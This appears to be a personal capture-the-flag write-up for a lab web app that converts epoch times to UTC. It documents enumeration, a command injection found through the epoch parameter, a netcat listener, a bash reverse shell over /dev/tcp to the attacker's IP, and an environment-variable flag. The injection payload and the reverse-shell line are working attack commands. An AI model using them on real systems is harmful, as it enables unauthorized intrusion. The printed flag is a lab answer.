# Enumeration Phase
## ping scan
```zsh
❯ ping 10.10.138.184
PING 10.10.138.184 (10.10.138.184) 56(84) bytes of data.
64 bytes from 10.10.138.184: icmp_seq=1 ttl=63 time=56.3 ms
64 bytes from 10.10.138.184: icmp_seq=2 ttl=63 time=56.1 ms
^C
--- 10.10.138.184 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1001ms
rtt min/avg/max/mdev = 56.136/56.204/56.272/0.068 ms
```
## [[nmap]] scan
```zsh
❯ sudo nmap -sC -sV -p- -oN nmap_results.txt 10.10.138.184  

```
## website source code
```html
<!DOCTYPE html>

<head>
    <link rel="stylesheet" href="[https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css](view-source:https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css)"
        integrity="sha384-JcKb8q3iqJ61gNV9KGb8thSsNjpSL0n8PARn9HuZOnIxN0hoP+VmmDGMN5t9UJ0Z" crossorigin="anonymous">
    <style>
        body,
        html {
            height: 100%;
        }
    </style>
</head>

<body>
    <div class="container h-100">
        <div class="row mt-5">
            <div class="col-12 mb-4">
                <h3 class="text-center">Epoch to UTC convertor ⏳</h3>
            </div>
            <form class="col-6 mx-auto" action="[/](view-source:http://10.10.138.184/)">
                <div class=" input-group">
                    <input name="epoch" value="" type="text" class="form-control" placeholder="Epoch"
                        aria-label="Epoch" aria-describedby="basic-addon2" required>
                    <div class="input-group-append">
                        <button class="btn btn-outline-secondary" type="submit">Convert</button>
                    </div>
                </div>
            </form>
            <div class="col-9 mt-4 mx-auto">
                <pre></pre>
            </div>
        </div>
    </div>
</body>

</html>
```
## webapp look
![[Pasted image 20221029123707.png]]
## testing the webapp
Entering value 0 we get Thu Jan  1 00:00:00 UTC 1970
Entering value -1 we get Wed Dec 31 23:59:59 UTC 1969
Entering value  * we get exit status 1
Entering value 1/0 we get exit status 1
## webapp link
```url
http://10.10.138.184/?epoch=1%2F0
```
notes: command injection vuln?
## BurpSuite
```http
GET /?epoch=1%26%26id HTTP/1.1
Host: 10.10.138.184
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://10.10.138.184/?epoch=whoami
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```
Notes: 
- I've URL encoded the && operators then put 'id' command after it.
- got the id back.
```html
<pre>Thu Jan  1 00:00:01 UTC 1970
uid=1000(challenge) gid=1000(challenge) groups=1000(challenge)
</pre>
```
- command injection works.
# Weaponization Phase
## netcat listener
```zsh
❯ nc -nvlp 1234         
Listening on 0.0.0.0 1234
```
# Exploitation Phase
## running basic bash reverse shell
```zsh
bash -i >& /dev/tcp/10.11.4.14/1234 0>&1
```
## receiving a reverse shell
```zsh
❯ nc -nvlp 1234         
Listening on 0.0.0.0 1234
Connection received on 10.10.138.184 57422
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
challenge@e7c1352e71ec:~$ 
```
# Flag
from the hint:  "The developer likes to store data in environment variables, can you find anything of interest there?"
```zsh
challenge@e7c1352e71ec:/$ printenv
printenv
HOSTNAME=e7c1352e71ec
PWD=/
HOME=/home/challenge
LS_COLORS=
GOLANG_VERSION=1.15.7
FLAG=flag{7da6c7debd40bd611560c13d8149b647}
SHLVL=2
PATH=/usr/local/go/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
_=/usr/bin/printenv
OLDPWD=/dev
```
```zsh
FLAG=flag{7da6c7debd40bd611560c13d8149b647}
```